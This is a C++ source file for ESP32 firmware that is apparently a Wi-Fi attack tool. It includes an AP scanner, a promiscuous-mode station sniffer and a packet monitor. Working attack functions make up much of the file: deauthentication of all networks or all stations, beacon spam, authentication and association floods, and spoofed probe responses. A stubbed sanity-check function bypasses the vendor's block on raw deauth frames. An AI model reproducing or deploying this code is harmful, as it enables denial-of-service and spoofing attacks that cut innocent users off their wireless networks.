#include <stdint.h>
#include "pgmspace.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "wifiP.h"
#include <map>
#include <vector>
#include <array>

// packet
bool packetMonitorActive = false;

uint32_t packets = 0;
uint32_t tmpDeauths = 0;
uint32_t deauths = 0;
uint32_t beaconPackets = 0;
uint32_t probePackets = 0;
uint32_t dataPackets = 0;

unsigned long snifferStartTime = 0;
unsigned long snifferPacketTime = 0;
unsigned long snifferChannelTime = 0;

bool channelHopping = false;

uint16_t packetList[SCAN_PACKET_LIST_SIZE] = {0};

uint16_t packetListIdx = 0;

uint8_t currentChannelIdx = 0;

bool useOnlyNonDFS = true;

// Lib
macAddr macStore[STORE_LEN];
uint8_t macCursor = 0;

std::map<uint8_t,std::vector<STAInfo>> channelSTAMap;

std::map<uint8_t, std::vector<BSSIDInfo>> channelAPMap;
uint8_t totalAPCount = 0;

const uint8_t nx::wifi::channelList[37] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,
  36,40,44,48,52,56,60,64,100,104,108,112,116,124,128,132,136,140,
  149,153,157,161,165
};

const size_t nx::wifi::channelCount = sizeof(channelList) / sizeof(channelList[0]);

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t){
  return (arg == 31337) ? 1 : 0;
}

void nx::wifi::debug_print(const char* context){
  Serial.printf("[WIFI] %s\n", context);
}

void nx::wifi::storeMac(const uint8_t* mac){
  memcpy(macStore[macCursor].addr, mac, 6);
  macCursor = (macCursor + 1) % STORE_LEN;
}

bool nx::wifi::checkedMac(const uint8_t* mac){
  for(uint8_t i = 0; i < STORE_LEN; i++) if(! memcmp(mac, macStore[i].addr, 6)) return true;
  return false;
}

void nx::wifi::clearMacStored(){
  debug_print("Stored MAC cleared");
  memset(macStore, 0, sizeof(macStore));
  macCursor = 0;
}

bool macBroadcast(const uint8_t* mac){
  return (mac[0] == 0xFF && mac[1] == 0xFF &&mac[2] == 0xFF &&mac[3] == 0xFF &&mac[4] == 0xFF &&mac[5] == 0xFF);
}

bool macMulticast(const uint8_t* mac){
  return (mac[0] & 0x01);
}

bool macValid(const uint8_t* mac){
  if(mac[0] == 0x00 &&mac[1] == 0x00 &&mac[2] == 0x00 &&mac[3] == 0x00 &&mac[4] == 0x00 &&mac[5] == 0x00) return false;
  return true;
}

int findAP(const uint8_t* mac){
  for (auto& entry: channelAPMap){
    for(auto& ap : entry.second){
      if(memcmp(ap.bssid.data(),mac,6) == 0){
        return 1; // found
      }
    }
  }
  return -1; // not found
}

bool isDFSChannel(uint8_t ch){
  return(ch >= 52 && ch <= 140);
}

uint16_t totalSTACount = 0;

int findSTA(const uint8_t* mac){
  for(auto& entry: channelSTAMap){
    for(auto& sta: entry.second){
      if(memcmp(sta.staMac.data(),mac,6) == 0) return 1;
    }
  }
  return -1;
}

void addOrUpdateSTA(const uint8_t* staMac,const uint8_t* apMac,uint8_t channel){
  if(channelSTAMap.find(channel) != channelSTAMap.end()){
    for(auto& sta: channelSTAMap[channel]){
      if(memcmp(sta.staMac.data(),staMac,6) == 0){
        sta.update();
        if(memcmp(sta.staMac.data(),apMac,6) != 0) memcpy(sta.apMac.data(),apMac,6);
        return;
      }
    }
  }
  // add new sta
  STAInfo newSTA(staMac,apMac);
  channelSTAMap[channel].push_back(newSTA);
  totalSTACount++;

  Serial.printf("[WIFI] new client found: %02X:%02X:%02X:%02X:%02X:%02X -> AP %02X:%02X:%02X:%02X:%02X:%02X CH: %d \n",
                staMac[0],staMac[1],staMac[2],staMac[3],staMac[4],staMac[5],
                apMac[0],apMac[1],apMac[2],apMac[3],apMac[4],apMac[5],
                channel
                );
}

void nx::wifi::clearSTAMap(){
  channelSTAMap.clear();
  totalSTACount = 0;
  debug_print("STA map clear");
}

uint8_t nx::wifi::getSTACount() {
  return totalSTACount;
}

std::vector<STAInfo> nx::wifi::getSTAsByChannel(uint8_t channel){
  if(channelSTAMap.find(channel) != channelSTAMap.end()) return channelSTAMap[channel];
  return std::vector<STAInfo>();
}

std::vector<STAInfo> nx::wifi::getSTAsByAP(const uint8_t* apMac){
  std::vector<STAInfo> result;

  for(auto& entry: channelSTAMap){
    for(auto& sta: entry.second){
      if(memcmp(sta.apMac.data(),apMac,6) == 0) result.push_back(sta);
    }
  }
  return result;
}

void IRAM_ATTR snifferCallback(void* buf , wifi_promiscuous_pkt_type_t type){
  if (!packetMonitorActive) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*) buf;

  if(type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  const wifi_pkt_rx_ctrl_t* ctrl = &pkt->rx_ctrl;
  const uint8_t* payload = pkt->payload;
  uint16_t len = ctrl->sig_len;

  packets++;

  if(len < 28) return;

  uint8_t frameControl = payload[0]; // check frame type ex) deauth = 0xC0
  uint8_t frameType = frameControl & 0x0C;
  uint8_t frameSubtype = (frameControl & 0xF0) >> 4;

  if(frameType == 0x00){ //MGMT
    switch(frameSubtype){
      case 0x0C: // deauth
      case 0x0A: // disassoc
        tmpDeauths++;
        return;
      case 0x08: // beacon
        beaconPackets++;
        return;
      case 0x04: // probe reqest
      case 0x05: // probe response
        probePackets++;
        return;

      default:
        break;
    }
  }
  // Data Frame (0x08 , 0x88 etc.)
  if(frameType == 0x08){
    dataPackets++;
    // Addr 1 (Receiver): offset 4
    // Addr 2 (Transmitter): offset 10
    // Addr 3 (Bssid): offset16
    const uint8_t* addr1 = &payload[4];
    const uint8_t* addr2 = &payload[10];
    const uint8_t* addr3 = &payload[16];

    if(macBroadcast(addr1) || macBroadcast(addr2) || !macValid(addr1) || !macValid(addr2) || macMulticast(addr1) || macMulticast(addr2)) return;

    int apFound = findAP(addr2);
    if(apFound >= 0){
      // Station add (addr1 -> station)
      addOrUpdateSTA(addr1,addr2,ctrl->channel);
    }
    else{
      apFound = findAP(addr1);
      if(apFound >=0){
        // Station add (addr2 -> station)
        addOrUpdateSTA(addr2,addr1,ctrl->channel);
      }
      else{
        // addr3 check (bssid)
        apFound = findAP(addr3);
        if(apFound >= 0){
          uint8_t flags = payload[1];
          bool toDS = flags & 0x01;
          bool fromDS = flags & 0x02;
          // STA -> AP: addr2 is STA
          if(toDS && !fromDS) addOrUpdateSTA(addr2,addr3,ctrl->channel);
          // AP -> STA: addr1 is STA
          else if(!toDS && fromDS) addOrUpdateSTA(addr1,addr3,ctrl->channel);
        }
      }
    }
  
  }
}

void nx::wifi::setBandChannel(uint8_t channel){
  if(currentChannel == channel) return;
  
  esp_wifi_set_band((channel <= 14) ? WIFI_BAND_2G : WIFI_BAND_5G);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  currentChannel = channel;
  delay(10);
}

void nx::wifi::setChannelHopping(bool enable){
  channelHopping = enable;
  if(enable){
    currentChannelIdx = 0;
    snifferChannelTime = millis();
    debug_print("Channel Hopping enabled");
  }
  else debug_print("Channel Hopping disabled");
}

bool nx::wifi::getChannelHopping(){
  return channelHopping;
}

void nx::wifi::nextChannel(){
  do{
    currentChannelIdx++;
    
    if(currentChannelIdx >= channelCount) currentChannelIdx = 0;

    if(useOnlyNonDFS && isDFSChannel(channelList[currentChannelIdx])) continue;
    
    break;
  } while(true);

  uint8_t ch = channelList[currentChannelIdx];
  setBandChannel(ch);
}

void nx::wifi::prevChannel(){
  do{

    if(currentChannelIdx == 0) currentChannelIdx = channelCount - 1;
    else currentChannelIdx--;

    if(useOnlyNonDFS && isDFSChannel(channelList[currentChannelIdx])) continue;

    break;
  } while(true);

  uint8_t ch = channelList[currentChannelIdx];
  setBandChannel(ch);
}

void nx::wifi::nextChannelToAP(){
  if(channelAPMap.empty()){
    nextChannel();
    return;
  }

  auto it = channelAPMap.upper_bound(currentChannel);

  if(it == channelAPMap.end()) it = channelAPMap.begin();
  if(it != channelAPMap.end()){
    uint8_t nextCh = it->first;
    setBandChannel(nextCh);

    for(size_t i = 0;i<channelCount;i++){
      if(channelList[i] == nextCh){
        currentChannelIdx = i;
        break;
      }
    }
  }
}





void nx::wifi::setUseDFS(bool enable){
  useOnlyNonDFS =! enable;
}

bool nx::wifi::getUseDFS(){
  return ! useOnlyNonDFS;
}

// IEEE 802.11 deauthentication frame template with reason code 7 (Class 3 frame received from nonassociated STA)
static const uint8_t deauthFrameTemplate[26] PROGMEM = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void nx::wifi::txDeauthFrameAll(){
  if(channelAPMap.empty()){
    debug_print("No APs to attack");
    return;
  }
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    auto& bssids = entry.second;
    
    if(bssids.empty()) continue;

    for(auto& bssidInfo : bssids){
      txDeauthFrameBSSID(bssidInfo.bssid.data(),channel);
    }
  }
}

void nx::wifi::txDeauthFrameChannel(uint8_t channel){
  if(channelAPMap.find(channel) == channelAPMap.end()){
    Serial.printf("[WIFI] No APs found on channel %d\n", channel);
    return;
  }
  
  auto& bssids = channelAPMap[channel];
  if(bssids.empty()) return;
  
  for(auto& bssidInfo :  bssids){
    txDeauthFrameBSSID(bssidInfo.bssid.data(),channel);
  }
}

void nx::wifi::txDeauthFrameBSSID(const uint8_t* bssid, uint8_t channel){
  if(bssid == nullptr){
    debug_print("Invalid BSSID");
    return;
  }
  
  setBandChannel(channel);
  
  uint8_t pkt[26];
  memcpy_P(pkt, deauthFrameTemplate, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
}

void nx::wifi::txDeauthFrameSTA(const uint8_t* staMac,const uint8_t* apMac,uint8_t channel){
  if(staMac == nullptr || apMac == nullptr) return;

  setBandChannel(channel);

  uint8_t pkt[26];

  memcpy_P(pkt,deauthFrameTemplate,26);
  memcpy(&pkt[4],staMac,6); // Destination: STA
  memcpy(&pkt[10],apMac,6); // Soruce: AP
  memcpy(&pkt[16],apMac,6); // BSSID: AP
  
  for(uint8_t i = 0 ; i < PER_PKT;i++) esp_wifi_80211_tx(WIFI_IF_STA,pkt,sizeof(pkt),false);
}

void nx::wifi::txDeauthFrameAllSTAs(){
  if(channelSTAMap.empty()) return;

  for(auto& entry: channelSTAMap){
    uint8_t channel = entry.first;
    auto& stations = entry.second;

    for (auto& sta : stations)txDeauthFrameSTA(sta.staMac.data(),sta.apMac.data(),channel);
  }
}

void nx::wifi::txDeauthFrameSTAsByChannel(uint8_t channel){
  if(channelSTAMap.find(channel) == channelSTAMap.end()) return;
  auto& stations = channelSTAMap[channel];
  if(stations.empty()) return;

  for(auto& sta: stations) txDeauthFrameSTA(sta.staMac.data(),sta.apMac.data(),channel);
}

void nx::wifi::txBeaconFrame(const char* ssid, uint8_t channel, const uint8_t* bssid, bool encrypted){
  if(ssid == nullptr || bssid == nullptr) return;
  
  uint8_t ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  // Open:       0x0401 (ESS, Short Preamble)
  // Encrypted: 0x0411 (ESS, Short Preamble, Privacy)
  static const uint8_t beaconTemplateOpen[38] PROGMEM = {
    0x80, 0x00,                          // Frame Control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID) - will be replaced
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID - will be replaced
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0xE8, 0x03,                          // Beacon interval
    0x01, 0x04                           // Capability (Open)
  };
  
  static const uint8_t beaconTemplateEncrypted[38] PROGMEM = {
    0x80, 0x00,                          // Frame Control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0xE8, 0x03,                          // Beacon interval
    0x11, 0x04                           // Capability (Privacy bit set)
  };
  
  uint8_t pkt[128];
  
  if(encrypted) memcpy_P(pkt, beaconTemplateEncrypted, 38);
  else memcpy_P(pkt, beaconTemplateOpen, 38);

  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  int idx = 38;
  pkt[idx++] = 0x00;
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen);
  idx += ssidLen;

  static const uint8_t rates[10] PROGMEM = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
  };
  memcpy_P(&pkt[idx], rates, 10);
  idx += 10;
  
  // DS Parameter (channel)
  pkt[idx++] = 0x03;
  pkt[idx++] = 0x01;
  pkt[idx++] = channel;
  
  if(encrypted){
    // RSN Information Element (WPA2)
    static const uint8_t rsnInfo[26] PROGMEM = {
      0x30, 0x18,                    // Tag:  RSN, Length: 24
      0x01, 0x00,                    // Version: 1
      0x00, 0x0F, 0xAC, 0x04,       // Group Cipher: CCMP (AES)
      0x01, 0x00,                    // Pairwise Cipher Count: 1
      0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher: CCMP (AES)
      0x01, 0x00,                    // AKM Suite Count: 1
      0x00, 0x0F, 0xAC, 0x02,       // AKM Suite:  PSK
      0x00, 0x00                     // RSN Capabilities
    };
    memcpy_P(&pkt[idx], rsnInfo, 26);
    idx += 26;
  }
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
}

// Authentication frame templates for 2.4GHz and 5GHz bands - shared across auth functions
static const uint8_t authTemplate2G[30] PROGMEM = {
  0xB0, 0x00,                          // Frame Control 
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x00, 0x00,                          // Auth algorithm (Open System)
  0x01, 0x00,                          // Auth sequence
  0x00, 0x00                           // Status code
};

static const uint8_t authTemplate5G[30] PROGMEM = {
  0xB0, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x00, 0x00,                          // Auth algorithm (Open System)
  0x01, 0x00,                          // Auth sequence
  0x00, 0x00                           // Status code
};

// HT Capabilities - shared across auth and assoc functions
static const uint8_t htCapabilities[28] PROGMEM = {
  0x2D, 0x1A,                          // Tag:  HT Capabilities, Length: 26
  0xEF, 0x09,                          // HT Capabilities Info
  0x17,                                 // A-MPDU Parameters
  0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MCS Set
  0x00, 0x00,                          // HT Extended Capabilities
  0x00, 0x00, 0x00, 0x00,             // Transmit Beamforming
  0x00                                 // ASEL Capabilities
};

void nx::wifi::txAuthFrame(const uint8_t* bssid, uint8_t channel){
  if(bssid == nullptr) return;
  
  bool is5GHz = (channel > 14);
  
  uint8_t pkt[128];
  int pktLen;
  
  uint8_t clientMAC[6];
  for(int i = 0; i < 6; i++) clientMAC[i] = random(0, 256);
  clientMAC[0] &= 0xFE;
  
  if(is5GHz){
    memcpy_P(pkt, authTemplate5G, 30);
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[10], clientMAC, 6);
    memcpy(&pkt[16], bssid, 6);
    
    // Add HT Capabilities
    memcpy_P(&pkt[30], htCapabilities, 28);
    pktLen = 58;
  } else {
    memcpy_P(pkt, authTemplate2G, 30);
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[10], clientMAC, 6);
    memcpy(&pkt[16], bssid, 6);
    pktLen = 30;
  }
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, pktLen, false);
}

void nx::wifi::txAuthFlood(){
  if(channelAPMap.empty()) return;
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    for(auto& bssidInfo : entry.second) txAuthFrame(bssidInfo.bssid.data(), channel);
  }
}

// Association request frame templates for 2.4GHz and 5GHz bands - shared
static const uint8_t assocTemplate2G[28] PROGMEM = {
  0x00, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x01, 0x04,                          // Capability (ESS)
  0x0A, 0x00                           // Listen interval
};

static const uint8_t assocTemplate5G[28] PROGMEM = {
  0x00, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x01, 0x04,                          // Capability
  0x0A, 0x00                           // Listen interval
};

// Supported rates
static const uint8_t rates2G[10] PROGMEM = {
  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
  0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
};

static const uint8_t rates5G[10] PROGMEM = {
  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
  0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C
};

// VHT Capabilities for 5GHz 
static const uint8_t vhtCapabilities[14] PROGMEM = {
  0xBF, 0x0C,                          // Tag: VHT Capabilities, Length: 12
  0x32, 0x00, 0x80, 0x03,             // VHT Capabilities Info
  0xFA, 0xFF, 0x00, 0x00,             // Supported MCS Set
  0xFA, 0xFF, 0x00, 0x00              // Supported MCS Set 
};

static const uint8_t extCapabilities[10] PROGMEM = {
  0x7F, 0x08,                          // Tag: Extended Capabilities, Length: 8
  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};

void nx::wifi::txAssocFrame(const uint8_t* bssid, const char* ssid, uint8_t channel){
  if(bssid == nullptr || ssid == nullptr) return;
  
  uint8_t ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  
  bool is5GHz = (channel > 14);
  
  uint8_t pkt[256];
  int idx;
  
  uint8_t clientMAC[6];
  for(int i = 0; i < 6; i++) clientMAC[i] = random(0, 256);
  clientMAC[0] &= 0xFE;
  
  if(is5GHz){
    memcpy_P(pkt, assocTemplate5G, 28);
    idx = 28;
  } else {
    memcpy_P(pkt, assocTemplate2G, 28);
    idx = 28;
  }

  memcpy(&pkt[4], bssid, 6);
  memcpy(&pkt[10], clientMAC, 6);
  memcpy(&pkt[16], bssid, 6);

  pkt[idx++] = 0x00;
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen);
  idx += ssidLen;
  
  // Supported Rates
  if(is5GHz){
    memcpy_P(&pkt[idx], rates5G, 10);
  } else {
    memcpy_P(&pkt[idx], rates2G, 10);
  }
  idx += 10;
  
  if(is5GHz){
    pkt[idx++] = 0x32;  // Tag:  Extended Supported Rates
    pkt[idx++] = 0x04;  // Length
    pkt[idx++] = 0x30;  // 24 Mbps
    pkt[idx++] = 0x48;  // 36 Mbps
    pkt[idx++] = 0x60;  // 48 Mbps
    pkt[idx++] = 0x6C;  // 54 Mbps
  }
  
  // HT Capabilities
  memcpy_P(&pkt[idx], htCapabilities, 28);
  idx += 28;
  
  // VHT Capabilities
  if(is5GHz){
    memcpy_P(&pkt[idx], vhtCapabilities, 14);
    idx += 14;
  }
  
  memcpy_P(&pkt[idx], extCapabilities, 10);
  idx += 10;
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
}

void nx::wifi::txAssocFlood(){
  if(channelAPMap.empty()) return;
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    for(auto& bssidInfo : entry.second){
      const char* ssid = bssidInfo.ssid.empty() ? "Network" : bssidInfo.ssid.c_str();
      txAssocFrame(bssidInfo.bssid.data(), ssid, channel);
    }
  }
}

void nx::wifi::txProbeResponse(const uint8_t* bssid,const char* ssid,uint8_t channel,const uint8_t* destMac){
 if(bssid == nullptr || destMac == nullptr) return;

  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  static const uint8_t probeRespTemplate[38] PROGMEM = {
    0x50,0x00,
    0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0xE8,0x03,
    0x11,0x04
  };

  uint8_t pkt[128];

  memcpy_P(pkt,probeRespTemplate,38);

  memcpy(&pkt[4] , destMac,6);
  memcpy(&pkt[10], bssid,6);
  memcpy(&pkt[16], bssid,6);

  int idx = 38;
  static const uint8_t rates[10] PROGMEM = {
    0x01,0x08,0x82,0x8B,0x96,0x0c,0x12,0x18,0x24
  };

  pkt[idx++] = 0x00;
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx],ssid,ssidLen);
  idx += ssidLen;

  memcpy_P(&pkt[idx], rates,10);
  idx += 10;
  pkt[idx++] = 0x03;
  pkt[idx++] = 0x01;
  pkt[idx++] = channel;

  setBandChannel(channel);
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA,pkt,idx,false);
}

void nx::wifi::init(){
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);
  currentChannel = 0;
  debug_print("WiFi init success");
}

void nx::wifi::processScanResults(int scanCount, uint8_t channel, int& totalScan, bool verbose) {
  if(scanCount <= 0) return;
  
  for(int i = 0; i < scanCount; i++){
    const uint8_t* bssid = WiFi.BSSID(i);
    String ssid = WiFi.SSID(i);
    wifi_auth_mode_t authMode = WiFi.encryptionType(i);
    bool encrypted = (authMode != WIFI_AUTH_OPEN);
    
    BSSIDInfo newBSSID(bssid, ssid.c_str(), encrypted);
    
    bool duplicate = false;
    if(channelAPMap.find(channel) != channelAPMap.end()){
      for(auto& stored : channelAPMap[channel]){
        if(stored == newBSSID){
          duplicate = true;
          break;
        }
      }
    }
    
    if(!duplicate){
      channelAPMap[channel].push_back(newBSSID);
      totalAPCount++;
      
      if(verbose){
        Serial.printf("[WIFI] Ch %d:  %s (%02X:%02X:%02X:%02X:%02X:%02X) %s\n", 
                      channel, 
                      newBSSID.ssid.empty() ? "<Hidden>" : newBSSID.ssid.c_str(),
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                      encrypted ? "[ENC]" : "[OPEN]");
      }
    }
  }
  totalScan += scanCount;
}

int nx::wifi::scanNetwork(bool all, uint8_t channel){
  WiFi.scanDelete();
  int totalScan = 0;
  
  if(all || channel == 0){
    channelAPMap.clear();
    totalAPCount = 0;
  }
  
  if(! all && channel != 0){
    setBandChannel(channel);
    int scan = WiFi.scanNetworks(false, true, false, 500, channel);
    processScanResults(scan, channel, totalScan, true);
  }
  else{
    for(size_t i = 0; i < channelCount; i++){
      uint8_t ch = channelList[i];
      setBandChannel(ch);
      int scan = WiFi.scanNetworks(false, true, false, 500, ch);
      processScanResults(scan, ch, totalScan, false);
    }
  }
  
  return totalScan;
}

void nx::wifi::performProgressiveScan(){
  if(channelIndex == 0 && millis() - lastScan > scanInterval){
    channelAPMap.clear();
    totalAPCount = 0;
  }
  
  if(millis() - lastScan > scanInterval){
    uint8_t channel = channelList[channelIndex];
    scanNetwork(false, channel);
    
    channelIndex = (channelIndex + 1) % channelCount;
    lastScan = millis();
    
    if(channelIndex == 0){
      scanComplete = true;
    }
  }
}

void nx::wifi::startSTAScan(){
  if(staScanActive){
    debug_print("STA scan already active");
    return;
  }
  if(channelAPMap.empty()){
    debug_print("Please scan APs first before scanning STAs");
    return;
  }

  channelSTAMap.clear();
  totalSTACount = 0;

  staChannelIndex = 0;
  lastSTAScan = 0;
  staScanComplete = false;
  staScanActive = true;

  if(!packetMonitorActive) startPacketMonitor();
  debug_print("Progressive STA scan started");
}

void nx::wifi::stopSTAScan(){
  if(!staScanActive){
    debug_print("STA scan not active");
    return;
  }
  staScanActive = false;
  staScanComplete = true;

  debug_print("STA scan stop");
}

int nx::wifi::scanSTAOnChannel(uint8_t channel){
  if(channelAPMap.find(channel) == channelAPMap.end()) return 0;

  setBandChannel(channel);

  int prevCount = 0;
  if(channelSTAMap.find(channel) != channelSTAMap.end()) prevCount = channelSTAMap[channel].size();

  unsigned long scanStart = millis();
  while(millis() - scanStart < PACKET_MONITOR_CHANNEL_HOPPING_INTERVAL){
    updatePacketMonitor();
    delay(10);
  }
  int currentCount = 0;
  if(channelSTAMap.find(channel) != channelSTAMap.end()) currentCount = channelSTAMap[channel].size();

  int foundSTAs = currentCount - prevCount;

  if(foundSTAs > 0) Serial.printf("[WIFI] Ch %d: Found %d new station(s)\n",channel,foundSTAs);
  return foundSTAs;
}

void nx::wifi::performProgressiveSTAScan(){

  if(!staScanActive) return;

  if(staChannelIndex == 0 && millis() - lastSTAScan > staScanInterval) debug_print("Starting new STA scan cycle....");
  if(millis() - lastSTAScan > staScanInterval){
    uint8_t channel = channelList[staChannelIndex];

    if(channelAPMap.find(channel) != channelAPMap.end() && !channelAPMap[channel].empty()) scanSTAOnChannel(channel);

    staChannelIndex = (staChannelIndex + 1) % channelCount;
    lastSTAScan = millis();
    if(staChannelIndex == 0) staScanComplete = true;
  }

}

void nx::wifi::startPacketMonitor(){
  if(packetMonitorActive) return;
  // init
  packets = 0;
  tmpDeauths = 0;
  deauths = 0;
  beaconPackets = 0;
  probePackets = 0;
  dataPackets = 0;
  memset(packetList, 0 ,sizeof(packetList));
  packetListIdx = 0;

  snifferStartTime = millis();
  snifferPacketTime = millis();
  snifferChannelTime = millis();
  channelHopping = false;

  wifi_promiscuous_filter_t filter={
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };

  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_promiscuous(true);

  packetMonitorActive = true;

  debug_print("Packet Monitor started");
}

void nx::wifi::stopPacketMonitor(){
  if(!packetMonitorActive) return;

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  packetMonitorActive = false;

  debug_print("Packet Monitor stopped");
}

void nx::wifi::updatePacketMonitor(){
  if(!packetMonitorActive) return;

  unsigned long currentTime = millis();

  if(currentTime - snifferPacketTime > PACKET_LIST_UPDATE_INTERVAL){
    snifferPacketTime = currentTime;

    packetList[packetListIdx] = packets;
    packetListIdx = (packetListIdx + 1) % SCAN_PACKET_LIST_SIZE;

    deauths = tmpDeauths;
    tmpDeauths = 0;

    packets = 0;

    #ifdef DEBUG_PACKET_MONITOR
    Serial.printf("[PKT] Rate: %upps, Deauths: %lu, Beacons: %lu, Probes: %lu, Data: %lu \n",getPacketRate(),deauths,beaconPackets,probePackets,dataPackets);
    #endif
  }

  if(channelHopping && (currentTime - snifferChannelTime > PACKET_MONITOR_CHANNEL_HOPPING_INTERVAL)){
    snifferChannelTime = currentTime;

    if(channelAPMap.empty()) nextChannel();
    else nextChannelToAP();
  }
}

bool nx::wifi::isMonitoring(){
  return packetMonitorActive;
}

uint32_t nx::wifi::getPacketRate(){
  if(packetListIdx == 0) return packetList[SCAN_PACKET_LIST_SIZE - 1];
  return packetList[packetListIdx - 1];
}

uint32_t nx::wifi::getDeauthCount(){
  return deauths;
}
uint32_t nx::wifi::getBeaconCount(){
  return beaconPackets;
}
uint32_t nx::wifi::getProbeCount(){
  return probePackets;
}
uint32_t nx::wifi::getDataCount(){
  return dataPackets;
}

uint16_t nx::wifi::getPacketAtIdx(int idx){
  int pIdx = (packetListIdx + idx) % SCAN_PACKET_LIST_SIZE;
  return packetList[pIdx];
}

uint16_t nx::wifi::getMaxPacket(){
  uint16_t max = 0;

  for(uint8_t i = 0; i < SCAN_PACKET_LIST_SIZE; i++){
    if(packetList[i] > max) max = packetList[i];
  }
  if(max == 0) max = 1;
  return max;
}

double nx::wifi::getScaleFactor(uint8_t height){
  uint16_t maxPkt = getMaxPacket();
  if(maxPkt == 0) return 0.0;
  return (double)height / (double)maxPkt;
}